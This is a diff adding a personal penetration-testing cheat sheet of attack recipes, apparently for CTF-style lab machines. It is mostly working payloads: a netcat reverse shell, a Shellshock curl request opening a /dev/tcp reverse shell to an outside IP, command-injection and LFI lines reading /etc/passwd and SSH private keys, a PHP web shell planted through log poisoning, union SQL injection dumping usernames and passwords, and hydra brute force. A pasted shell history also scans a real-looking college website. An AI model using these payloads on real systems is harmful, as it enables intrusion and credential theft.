@@ -1,0 +1,322 @@
+#####################################FILE UPLOAD VULN ################################################
+If we got any file upload vuln
+ 
+
+(1)We upload a shell.php
+And execute it
+Shell.php file downlod from pentest monkey
+
+(2) if .php extantion is not allowed then we change the extention
+       mv shell.php shell.phtml
+
+php
+.php3
+.php4
+.php5
+.phtml
+
+
+
+####################################COMMAND LINE VULN ####################################################
+  (1)We put the base64 command and got rev connection
+(2)if we got any ping command exe vuln
+                                                                       ;more cat /etc/passwd
+                                                                        ping 192.168.0.1 | id
+                                                                        ping 192.168.0.1;id
+                                                                        ping 192.168.0.1; `id`
+            if ping cmd not execute cat <path>
+              check
+             Nc bypass
+            Base64 shell=nc.traditional -e /bin/bash 192.168.1.125 4444
+
+ 
+
+                   127.0.0.1 | `echo "<base64>" | bse64 -d`
+
+
+(3)If any cmd exe in website then wee captuire the request in burp and change the command
+
+(4).ssh file check if cmd execute =cat /home/kali/.ssh/id_rsa
+
+
+
+
+  #########################################CMS VULN#########################################################
+  (1)Cmsmap fro find cms
+(2)admin:admin
+(3)check cms default credintial
+(4)if we got any user name the crack pass through burpsuit
+(5)check cms exploit =searchsploit 
+                                        explitdb
+                                        manually
+
+
+
+  #################################################WORDPRESS AND CREATE WORDLIST#####################################
+  Wpscan --url http://192.168.0.1 --enumerate u  = user enum
+Wpscan --url http://192.168.0.1 -P /usr/share/wordlists/rockyou.txt --usernames tom
+" we creat a wordlists from web page and use as a password lists"
+
+Wpscan --url http://192.168.0.1 --enumerate ap
+If we got any plugins then searchploit
+                             expliitdb
+                               manually
+
+
+
+-----------------Create a wordlists=cewl--------------------------------------------------------------
+                                  crunch tool
+
+
+
+2064  cd tool
+ 2065  git clone https://github.com/dionach/CMSmap.git
+ 2070  ls -la
+ 2072  ./cmsmap.py
+ 2075  cd cmsmap
+ 2080  cmsmap.py --help
+ 2081  cmsmap.py -h
+ 2083  rm -rf CMSmap
+ 2084  git clone https://github.com/The404Hacking/CMSmap.git
+ 2086  cd CMSmap
+ 2088  cmsmap.py
+ 2089  python cms.py
+ 2090  python cmsmap.py
+ 2091  python3 cmsmap.py
+ 2092  python2 cmsmap.py
+ 2093  python2 cmsmap.py -t http://www.zakirhusaindelhicollege.ac.in/
+ 2094  cd ..
+ 2095  cewl
+ 2096  cewl --help
+ 2097  cewl http://vulnweb.com 
+ 2098  cewl http://vulnweb.com -m 8
+ 2099  cewl http://craw.in -e
+ 2100  cewl http://craw.in -e -n
+ 2101  cewl https://craw.in -e -n
+ 2103  cewl https://digi.ninja/contact.php -e -n
+ 2104  cewl http://www.zakirhusaindelhicollege.ac.in/ -e -n
+ 2105  cewl https://digi.ninja/contact.php -c
+ 2106  cewl http://vulnweb.com -c
+ 2107  crunch
+ 2109  history
+ 2110  crunch 1 3 -o 1.txt
+ 2111  head -n 30 
+ 2112  head -n 30 > 1.txt
+ 2113  head -n 30 1.txt
+ 2115  cat 1.txt
+ 2116  crunch 1 3 -o 2.txt
+ 2117  head -n 30 2.txt
+ 2118  crunch 4 6 abc123 -o 3.txt
+ 2119  head -n 30 3.txt
+ 2120  crunch 1 3 "abc " -o 4.txt
+ 2121  cat 4.txt
+ 2125  crunch 4 4 -f charset.lst mixalpha-numeric-sv -o wordlists.txt
+ 2126  crunch 4 4 -f charset.lst mixalpha-numeric-sv -o /home/kali/Desktop/wordlists.txt
+ 2127  cat /home/kali/Desktop/wordlists.txt
+ 2128  cat charset.lst
+ 2129  cd /home/kali/Desktop
+ 2130  crunch 3 6 A123B -o file.txt
+ 2131  cat file.txt
+ 2132  cd /usr/share/crunch
+ 2133  ls
+ 2134  crunch 6 6 -t ,%%%%, -o 6.txt
+ 2135  head -n 30 6.txt
+
+
+-t for pattern
+
+
+
+
+
+############################################################ID_RSA KEY#####################################################
+  Id_rsa = chmod 600id_rsa
+                ssh -I id_rsa tom@<ip>
+
+
+
+
+  #############################################################USERNAME####################################################
+  Username = hydra -l <usr> -P /usr/share/wordlists/rockyou.txt <ip> -t 4 ssh
+  &&&
+  ALL Port Brute force
+
+
+
+
+  #############################################################HASH########################################################
+  Hsah stored iin a file and 
+
+Hash.txt
+
+(1)john --wordlists=/usr/share/wordlists/rockyou.txt hash.txt
+(2)hashid 
+     hashcat
+(3)Crack station
+
+
+  ############################################################ID_RSA PASSPHARSE#############################################
+  Mv id_rsa hash.txt
+John --wordlists=/usr/share/wordlists/rockyou.txt hash.txt
+
+
+Ssh crack github
+
+
+  ###########################################################ZIPFILE PASS CRACK###################################################
+  Zip2john
+Zip2john suman.zip hash.txt
+John --wordlists=/usr/share/wordli/rockyou.txt hash.txt
+Fcrack zip tool
+
+
+  ##########################################################IMAGE FILE############################################################
+  (1)Steghide
+(2)String <img>
+
+
+  ############################################################TEXT DECODE##########################################################
+
+  Burp use to decode
+
+&& 
+
+Cyber chef website
+
+
+
+echo 'bGludXhoaW50LmNvbQo=' | base64 --decode
+
+From <https://linuxhint.com/bash_base64_encode_decode/> 
+
+
+  ########################################################.WAV FILE DECODE###########################################################
+
+  Morce code decoder
+
+https://morsecode.world/international/decoder/audio-decoder-adaptive.html
+
+  ###########################################################NORMAL FILE ##########################################################
+
+  If we not get anything from cat
+Chmod 777 file
+./file
+
+
+
+
+
+If we not get anything ls 
+more 
+
+  ##############################################################MOD SSL LINUX BUFF#################################################
+
+  Search exploit = tran2open
+Rev connection through Trans2open 
+
+
+
+  ##########################################################SQL TRUE CINDITION#######################################################
+
+
+
+  Try true condition in login page =1'or'1'='1
+
+
+
+  #############################################################MANUAL SQLI#############################################################
+
+  Php?id=44'
+Sql
+
+Database
+Table
+Column
+0x3a=separate code
+
+Php?id=44 order by 5--+   =for coulmn find
+            8' union select 1,2,3,4,5,6,7--+ = vuln column find
+
+
+             -
+           -44 union select 1,2,group_concat(column_name),4,5%20 from information_schema.columns where table_name='admin' --
+
+-44 union select 1,2,group_concat(username,password),4,5%20 from users --+
+
+
+
+#########################################################LFI && RFI#################################################################
+
+  Cheat sheet=https://highon.coffee/blog/lfi-cheat-sheet/
+
+
+
+
+../../../../../../../../../../../etc/passwd
+../../../../../../home/kali/.ssh/id_rsa
+Log poisioning
+../../../../../var/log/apache2/access.log   = <?php system($_GET["cmd"];) ?>/////<pre>system($_REQUEST['cmd'])</pre>
+
+"
+ nc 192.168.43.234 80
+GET <?php system($_GET[‘cmd’]);?> HTTP/1.1
+
+”
+
+
+
+
+
+
+
+Port knoking
+Vsftpd exe
+payload
+
+
+
+
+If lfi not work ../../etc/passwd command
+We use this
+
+Page=' and die(system('cat /etc/passwd')_or'
+
+
+
+
+
+###############################################################SHELLSHOCK########################################################
+
+  If we  got any cgi-bin dir then it was relatable to shallshock
+
+             curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.10.189.184//cgi-bin/test.c
+
+
+CONTENT ==  curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/ls -al /home/ryan/' bash -s :'' http://10.10.189.184//cgi-bin/test.cgi
+
+
+REVSHELL==curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.17.26.48/4444 0>&1' http://10.10.189.184/cgi-bin/test.cgi
+
+
+
+###############################################################PUT#################################################################
+
+We put a shell.php and got rev connection
+
+Cadaver
+Put shell.php http://192.168.0.1/dev
+
+
+
+
+
+
+  
+
+  
+
+  
+  
+  
+  
+
